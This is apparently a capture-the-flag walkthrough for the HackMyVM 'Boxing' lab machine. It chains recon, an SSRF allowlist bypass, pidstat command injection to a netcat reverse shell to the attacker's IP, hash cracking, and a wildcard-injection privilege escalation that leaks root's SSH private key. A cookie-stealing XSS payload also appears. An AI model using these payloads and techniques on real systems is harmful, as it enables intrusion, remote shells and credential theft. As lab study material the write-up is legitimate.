# Boxing

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.100:80
Open 10.0.2.100:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.100
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:74:2f:1c:d1:23:f6:1f:dd:3a:52:94:5d:8b:7c:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLY/Tir2FkRAXQpX/SIaJMH+KPi9iy+ORbcXQ8wNEeYMKqY3YBCu/UK6o4uEI67PItwJjQU6LDviN0lvscz6TAw=
|   256 96:fb:74:b2:7d:ac:66:40:e9:94:df:83:9a:a6:07:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Bu0Z/Y8/SDx2JYaJsoWxQzQWUgaLuni9OyAE4SdFm
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-title: Oxer
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

There's a domain name, make sure to include it in your DNS

![writeup.png](/assets/pentest/hackmyvm/boxing/writeup.png)

Nothing much from fuzzing
```bash
â””â”€$ feroxbuster -u http://10.0.2.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET      373l      757w    12460c http://10.0.2.100/class.html
200      GET      291l      656w     9704c http://10.0.2.100/about.html
200      GET      339l      764w    11165c http://10.0.2.100/blog.html
200      GET     4439l    10999w   131867c http://10.0.2.100/js/bootstrap.js
200      GET        2l     1276w    88145c http://10.0.2.100/js/jquery-3.4.1.min.js
200      GET      655l     1632w    23854c http://10.0.2.100/index.html
200      GET       51l      152w     1616c http://10.0.2.100/feedback.php
200      GET      655l     1632w    23854c http://10.0.2.100/
301      GET        9l       28w      309c http://10.0.2.100/images => http://10.0.2.100/images/
301      GET        9l       28w      305c http://10.0.2.100/js => http://10.0.2.100/js/
```

The "Feedback Form" seems to work? Returns "Thanks for your feedback!"

![writeup-1.png](/assets/pentest/hackmyvm/boxing/writeup-1.png)

XSS doesn't work
```html
<img src=x onerror=this.src='http://10.0.2.15/?'+document.cookie;>
```

### Staging Env

```bash
â””â”€$ curl http://10.0.2.100/feedback.php -d 'feedback=hello' -i
HTTP/1.1 200 OK
Date: Mon, 03 Nov 2025 17:27:06 GMT
Server: Apache/2.4.57 (Debian)
X-Origin-Domain: staging-env.boxing.hmv
Vary: Accept-Encoding
Content-Length: 154
Content-Type: text/html; charset=UTF-8

<div style='background-color: #0a0a0a; color: #6dbf47; font-family: Arial, sans-serif; padding: 20px; text-align: center;'>Thanks for your feedback!</div> 
```

Almost all type of URL I entered got denied with "Unauthorized URL"...

![writeup-2.png](/assets/pentest/hackmyvm/boxing/writeup-2.png)

```bash
â””â”€$ feroxbuster -u http://staging-env.boxing.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
301      GET        9l       28w      332c http://staging-env.boxing.hmv/cache => http://staging-env.boxing.hmv/cache/
200      GET       46l       91w     1167c http://staging-env.boxing.hmv/index.php
```

```bash
â””â”€$ wget http://staging-env.boxing.hmv/cache/ -r
â””â”€$ tree
.
â”œâ”€â”€ cache
â”‚Â Â  â”œâ”€â”€ 707971e003b4ae6c8121c3a920e507f5-le64.cache-8
â”‚Â Â  â”œâ”€â”€ CACHEDIR.TAG
â”‚Â Â  â”œâ”€â”€ client_requests.har.swp
â”‚Â Â  â”œâ”€â”€ data_block.bin
â”‚Â Â  â”œâ”€â”€ index.html
â”‚Â Â  â”œâ”€â”€ index.html?C=D;O=A
â”‚Â Â  â”œâ”€â”€ index.html?C=D;O=D
â”‚Â Â  â”œâ”€â”€ index.html?C=M;O=A
â”‚Â Â  â”œâ”€â”€ index.html?C=M;O=D
â”‚Â Â  â”œâ”€â”€ index.html?C=N;O=A
â”‚Â Â  â”œâ”€â”€ index.html?C=N;O=D
â”‚Â Â  â”œâ”€â”€ index.html?C=S;O=A
â”‚Â Â  â””â”€â”€ index.html?C=S;O=D
â”œâ”€â”€ icons
â”‚Â Â  â”œâ”€â”€ back.gif
â”‚Â Â  â”œâ”€â”€ binary.gif
â”‚Â Â  â”œâ”€â”€ blank.gif
â”‚Â Â  â”œâ”€â”€ text.gif
â”‚Â Â  â””â”€â”€ unknown.gif
â””â”€â”€ index.html
```

```bash
â””â”€$ file *
707971e003b4ae6c8121c3a920e507f5-le64.cache-8: data
CACHEDIR.TAG:                                  ASCII text
client_requests.har.swp:                       JSON text data
data_block.bin:                                data
```

```bash
â””â”€$ jq -r '.. | .text? // empty' client_requests.har.swp | php -r 'echo urldecode(fgets(STDIN));'
feedback=Hello! You don't have a link to reset the password, and I've forgotten it! I tried Cassius! but it doesn't work; Contact me asap pease!

Cassius
```

### SSRF

The URL inspector smells like SSRF, but nothing worked except `boxing.hmv`.

Using the authorization trick we can have `boxing.hmv` (whitelisted item) inside the URL and then proceed to do SSRF.
```bash
â””â”€$ curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@10.0.2.15'
---
â””â”€$ dirtypipe 80
Server on port 80...
--- Request at 2025-11-03 17:43:09 ---
Client: 10.0.2.100:53446
Method: GET
Path: /
Headers:
  Authorization: Basic Ym94aW5nLmhtdjo=
  Host: 10.0.2.15
  Connection: close
==================================================
```

```bash
â””â”€$ ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@0:FUZZ' -w <(seq 1 10000) -fs 1167
5000                    [Status: 200, Size: 2367, Words: 828, Lines: 96, Duration: 345ms]
```

![writeup-3.png](/assets/pentest/hackmyvm/boxing/writeup-3.png)

```bash
â””â”€$ curl 'http://staging-env.boxing.hmv/index.php' -sG --data-urlencode "url=boxing.hmv@0:5000?processName=php" | htmlq .output -t
Linux 6.1.0-17-amd64 (boxing)   03/11/2025      _x86_64_        (1 CPU)
18:51:00      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
18:51:00       33       520    0,00    0,01    0,00    0,03    0,01     0  php
```

### RCE

- [https://gtfobins.github.io/gtfobins/pidstat](https://gtfobins.github.io/gtfobins/pidstat)

By default the encoding for space is `%20`, but it doesn't seem to work. Using `+` as spaces worked.
```bash
â””â”€$ curl 'http://staging-env.boxing.hmv/index.php' -sG --data-urlencode 'url=boxing.hmv@0:5000?processName=php -e id' | htmlq .output -t
# Empty response

â””â”€$ curl 'http://staging-env.boxing.hmv/index.php' -sG --data-urlencode 'url=boxing.hmv@0:5000?processName=php+-e+id' | htmlq .output -t
Linux 6.1.0-17-amd64 (boxing)   03/11/2025      _x86_64_        (1 CPU)
uid=33(www-data) gid=33(www-data) groupes=33(www-data)

18:51:47      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
```

## Lateral Movement

```bash
â””â”€$ curl 'http://staging-env.boxing.hmv/index.php' -sG --data-urlencode 'url=boxing.hmv@0:5000?processName=php+-e+nc+10.0.2.15+4444+-e+/bin/bash' | htmlq .output -t
---
â””â”€$ pwncat-cs -lp 4444
[12:57:39] Welcome to pwncat ðŸˆ! 
[12:57:45] received connection from 10.0.2.100:58480 
[12:57:46] 10.0.2.100:58480: registered new host w/ db 
(local) pwncat$
(remote) www-data@boxing:/opt/pidstat$ id
uid=33(www-data) gid=33(www-data) groupes=33(www-data)
```

```php
(remote) www-data@boxing:/opt/pidstat$ cat index.php
<?php
if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1' || $_SERVER['REMOTE_ADDR'] === '::1') {
?>
    <form method="post">
        Process name: <input type="text" name="processName" placeholder="Type process">
        <input type="submit">
    </form>

<?php
    $processName = isset($_POST['processName']) ? $_POST['processName'] : (isset($_GET['processName']) ? $_GET['processName'] : null);

    if ($processName !== null) {
        $disallowed = ['|', ';', '$', '(', ')', '`', '<', '>', '[', ']', '&', '{', '}'];
        foreach ($disallowed as $char) {
            $processName = str_replace($char, '', $processName);
        }

        $command = "pidstat -C $processName";
        $output = shell_exec($command);

        echo "<div class='output'><pre>$output</pre></div>";
    }
} else {
    echo "<p>Access denied.</p>";
}
?>
```

```bash
(remote) www-data@boxing:/var/www/dev$ sqlite3 boxing_database.db '.tables' --box
fighters  matches   news      users
(remote) www-data@boxing:/var/www/dev$ sqlite3 boxing_database.db 'SELECT * FROM users;' --box
â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ id â”‚ username â”‚                        password_hash                         â”‚
â”œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1  â”‚ cassius  â”‚ $2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu â”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

```powershell
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
# Nothing
```

The user mentioned they reset their password, but don't remember what they wrote **exactly**. Recently I had a case where I registered to website with Caps Lock On ðŸ˜… and had to trace my steps back. We can try some rules against the password user provided to try to recover it.
```bash
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\wordlist.txt --rules=best64
Cassius!123      (cassius)
```

## SSH

```bash
â””â”€$ sshpass -p 'Cassius!123' ssh cassius@boxing.hmv
Last login: Sun Feb  4 17:20:33 2024 from 192.168.0.30
cassius@boxing:~$ id
uid=1000(cassius) gid=1000(cassius) groupes=1000(cassius),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

### User.txt

```bash
cassius@boxing:~$ cat user.txt
a2b3946358a96bb7a92f61a759a1d972
```

## Privilege Escalation

There's another project in `/opt`
```bash
cassius@boxing:/opt/sos$ cat incrontab.sh
#!/bin/bash

echo '/etc/apache2/sites-available/000-default.conf IN_MODIFY systemctl restart apache2' | incrontab -
echo '/etc IN_DELETE,IN_MODIFY,IN_MOVED_FROM /bin/echo "File: $@/$# => $%" > /root/user_flag.log' | incrontab -
echo '/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh' | incrontab -
```

```bash
cassius@boxing:/opt/sos$ cat sos.sh
#!/bin/bash

logs="/opt/sos/logs/output-logs.txt"
rm $logs
exec &>$logs

cd /home/cassius
file *
ss -altupn
last -a
w
ps aux
top -n 1
lsof

for user in $(cut -f1 -d: /etc/passwd); do
echo "Cron jobs for $user:"
crontab -u $user -l
done

tail /var/log/syslog
sha256sum /bin/* /sbin/* /usr/bin/* /usr/sbin/*

chmod 700 $logs
```

```bash
cassius@boxing:/opt/sos$ cat logs/output-logs.txt
cat: logs/output-logs.txt: Permission non accordÃ©e
```

- [https://wiki.archlinux.org/title/Incron](https://wiki.archlinux.org/title/Incron)
	- **IN_ATTRIB**: To trigger a command if metadata of a file change (e.g. timestamps, permissions):

```bash
# Start monitoring
cassius@boxing:~$ timeout 5 bash -c 'while true; do cat /opt/sos/logs/output-logs.txt > /tmp/output-logs.txt 2>/dev/null; done;' &
# Update to current time
cassius@boxing:~$ touch -a -m /home/cassius/user.txt

cassius@boxing:~$ cat /tmp/output-logs.txt
...
```

Nothing useful...

- [https://gtfobins.github.io/gtfobins/file/#file-read](https://gtfobins.github.io/gtfobins/file/#file-read)

The cronjob script has a vulnerability. It's using `*` which binary files may interpret filenames as command line flags. e.g.:
```bash
cassius@boxing:~$ touch -- '-f'
cassius@boxing:~$ ln -sf /etc/passwd ./passwd
cassius@boxing:~$ file *
root:x:0:0:root:/root:/bin/bash:                                                         cannot open `root:x:0:0:root:/root:/bin/bash' (No such file or directory)
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin:                                         cannot open `daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin' (No such file or directory)
bin:x:2:2:bin:/bin:/usr/sbin/nologin:                                                    cannot open `bin:x:2:2:bin:/bin:/usr/sbin/nologin' (No such file or directory)
sys:x:3:3:sys:/dev:/usr/sbin/nologin:                                                    cannot open `sys:x:3:3:sys:/dev:/usr/sbin/nologin' (No such file or directory)
sync:x:4:65534:sync:/bin:/bin/sync:                                                      cannot open `sync:x:4:65534:sync:/bin:/bin/sync' (No such file or directory)
...
```

```bash
cassius@boxing:~$ rm passwd
cassius@boxing:~$ ln -sf /root/.ssh/id_rsa id_rsa

cassius@boxing:~$ timeout 5 bash -c 'while true; do cat /opt/sos/logs/output-logs.txt > /tmp/output-logs.txt 2>/dev/null; done;' &
cassius@boxing:~$ touch -a -m /home/cassius/user.txt

cassius@boxing:~$ cat /tmp/output-logs.txt | grep 'END OPENSSH PRIVATE KEY' -B100 | cut -d':' -f1
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
â””â”€$ nano id_rsa.root
â””â”€$ chmod 600 id_rsa.root
â””â”€$ ssh -i id_rsa.root root@10.0.2.100
root@boxing:~# id
uid=0(root) gid=0(root) groupes=0(root)
```

### Root.txt

```
root@boxing:~# cat root.txt
19ed17ba1da85521ce659aeeb5ecd751
```